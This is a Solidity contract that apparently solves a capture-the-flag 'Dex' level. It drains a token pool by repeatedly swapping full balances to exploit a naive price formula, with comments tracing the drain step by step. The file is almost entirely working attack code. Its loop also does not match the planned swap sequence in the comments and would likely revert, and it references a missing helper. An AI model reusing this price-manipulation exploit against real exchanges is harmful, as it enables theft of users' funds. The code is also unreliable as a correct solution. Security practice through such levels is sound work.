// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Dex} from "./Dex.sol";

   //     token 1   | token 2
    // 10 in  | 100 | 100 | 10 out
    // 24 out | 110 |  90 | 20 in
    // 24 in  |  86 | 110 | 30 out
    // 41 out | 110 |  80 | 30 in
    // 41 in  |  69 | 110 | 65 out
    //        | 110 |  45 | 45 in

    // math for last swap
    // 110 = token2 amount in * token1 balance / token2 balance
    // 110 = token2 amount in * 110 / 45
    // 45  = token2 amount in

contract HackDex{
    Dex public dex;
    IERC20 public token1;
    IERC20 public token2;
    constructor(address _dex, address _token1,address _token2){
        dex = Dex(_dex);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function attakc() public{

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        dex.swap(address(token1), address(token2), 10);
        // _swap(token2, token1);
        // _swap(token1, token2);
        // _swap(token2, token1);
        // _swap(token1, token2);

        //swap 4 more times
          for (uint i = 0; i < 5; i++) {
            uint256 balance1 = token1.balanceOf(address(this));
            dex.swap(address(token1), address(token2), balance1);

            uint256 balance2 = token2.balanceOf(address(this));
            dex.swap(address(token2), address(token1), balance2);
        }
        

        
    }


}
